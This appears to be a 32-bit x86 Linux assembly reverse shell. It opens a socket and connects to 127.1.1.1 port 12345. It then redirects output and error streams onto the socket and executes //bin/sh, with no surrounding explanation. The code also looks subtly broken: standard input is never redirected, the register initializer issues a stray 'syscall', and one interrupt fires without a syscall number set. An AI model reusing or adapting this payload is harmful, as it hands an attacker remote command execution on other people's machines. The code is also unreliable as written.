section .text
	global _start:


;future optimization
;%macro exit 0
;	mov rax,60
;	mov rdi,0
;	syscall
;%endmacro

;%macro interrupt 0
;   int 0x80
;%endmacro

_start:

	call _initializeRegisters

	;ID 102
	call _socketCall

	;socket push to top of the stack
	push esi
	push 0x1
	push 0x2
	mov ecx,esp
	int 0x80

	mov edx,eax ;save return
	xor eax,eax
	push esi ;allignment
	push esi ;allignment
	push 0x0101017f ; 127.1.1.1
	push WORD 0x3930; port 12345
	push WORD 0x2
	mov ecx,esp

	push 16
	push ecx
	push edx
	mov ecx,esp
	mov al,102
	mov bl,3
	int 0x80

	xor eax,eax
	mov al,63 ;dup2
	mov ebx,edx
	xor ecx,ecx
	mov cl,0x1
	int 0x80

    xor eax,eax
    mov al,63 ;dup2
    mov ebx,edx
	xor ecx,ecx
    mov cl,0x2 ;err 
    int 0x80
	
	;shell
	xor eax,eax
	mov al,11 ;execve shell
	push esi ;null terminator
	push 0x68732f6e ; //bin/sh
	push 0x69622f2f
	mov ebx,esp
	mov ecx,esi
	mov edx,esi
	
	int 0x80

;@param      no parameters needed 
;@return     no return value, void initializer function
;@see https://stackoverflow.com/questions/1396527/what-is-the-purpose-of-xoring-a-register-with-itself
;@see https://stackoverflow.com/questions/33666617/what-is-the-best-way-to-set-a-register-to-zero-in-x86-assembly-xor-mov-or-and/33668295
_initializeRegisters:

	xor edi,edi
	xor ebx,ebx
	xor edx,edx
	xor eax,eax
	xor esi,esi
	xor ecx,ecx
	syscall
	ret

;102 socketcall
_socketCall:
	
	mov al,102
	mov bl,1
	ret
